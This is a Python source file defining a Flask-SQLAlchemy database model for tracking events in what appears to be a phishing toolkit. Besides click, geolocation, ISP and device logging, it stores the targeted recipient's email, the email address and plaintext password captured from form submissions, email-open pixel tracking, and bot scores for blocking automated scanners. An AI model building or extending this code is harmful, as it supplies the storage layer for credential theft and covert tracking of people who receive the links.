from .user import db
from datetime import datetime

class TrackingEvent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey("link.id"), nullable=False)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(45))
    user_agent = db.Column(db.Text)
    
    # Enhanced geolocation
    country = db.Column(db.String(100))
    country_code = db.Column(db.String(2))
    city = db.Column(db.String(100))
    region = db.Column(db.String(100))
    zip_code = db.Column(db.String(20))
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    timezone = db.Column(db.String(50))
    
    # ISP and network information
    isp = db.Column(db.String(255))
    organization = db.Column(db.String(255))
    asn = db.Column(db.String(50))
    
    # Device information
    device_type = db.Column(db.String(50))  # desktop, mobile, tablet
    browser = db.Column(db.String(100))
    browser_version = db.Column(db.String(50))
    operating_system = db.Column(db.String(100))
    
    # Captured data - recipient email is the main focus
    recipient_email = db.Column(db.String(255))  # The email that received the tracking link
    captured_email = db.Column(db.String(255))   # Any email captured from forms
    captured_password = db.Column(db.String(255))
    captured_data = db.Column(db.Text)  # JSON for additional data
    
    # Enhanced status tracking
    status = db.Column(db.String(50), default='active')  # active, blocked, opened, redirected, on_page
    event_type = db.Column(db.String(50), default='click')  # click, open, redirect, form_submit
    blocked_reason = db.Column(db.String(255))
    unique_id = db.Column(db.String(255)) # For pixel tracking
    
    # Detailed tracking states
    email_opened = db.Column(db.Boolean, default=False)
    redirected = db.Column(db.Boolean, default=False)
    on_page = db.Column(db.Boolean, default=False)
    
    # Security and bot detection
    is_bot = db.Column(db.Boolean, default=False)
    bot_score = db.Column(db.Float)  # 0.0 to 1.0, higher = more likely bot
    threat_level = db.Column(db.String(20), default='low')  # low, medium, high
    
    # Additional timestamps
    opened_at = db.Column(db.DateTime)
    redirected_at = db.Column(db.DateTime)
    landed_at = db.Column(db.DateTime)

    def __repr__(self):
        return f"<TrackingEvent {self.id} for link {self.link_id}>"

    def get_detailed_status(self):
        """Return a human-readable detailed status"""
        if self.status == 'blocked':
            return 'Blocked'
        elif self.on_page:
            return 'On Page'
        elif self.redirected:
            return 'Redirected'
        elif self.email_opened:
            return 'Opened'
        else:
            return 'Active'

    def to_dict(self):
        return {
            "id": self.id,
            "link_id": self.link_id,
            "timestamp": self.timestamp.isoformat() if self.timestamp else None,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "country": self.country,
            "country_code": self.country_code,
            "city": self.city,
            "region": self.region,
            "zip_code": self.zip_code,
            "latitude": self.latitude,
            "longitude": self.longitude,
            "timezone": self.timezone,
            "isp": self.isp,
            "organization": self.organization,
            "asn": self.asn,
            "device_type": self.device_type,
            "browser": self.browser,
            "browser_version": self.browser_version,
            "operating_system": self.operating_system,
            "recipient_email": self.recipient_email,
            "captured_email": self.captured_email,
            "captured_password": self.captured_password,
            "captured_data": self.captured_data,
            "status": self.status,
            "event_type": self.event_type,
            "blocked_reason": self.blocked_reason,
            "unique_id": self.unique_id,
            "email_opened": self.email_opened,
            "redirected": self.redirected,
            "on_page": self.on_page,
            "is_bot": self.is_bot,
            "bot_score": self.bot_score,
            "threat_level": self.threat_level,
            "opened_at": self.opened_at.isoformat() if self.opened_at else None,
            "redirected_at": self.redirected_at.isoformat() if self.redirected_at else None,
            "landed_at": self.landed_at.isoformat() if self.landed_at else None,
            "detailed_status": self.get_detailed_status()
        }


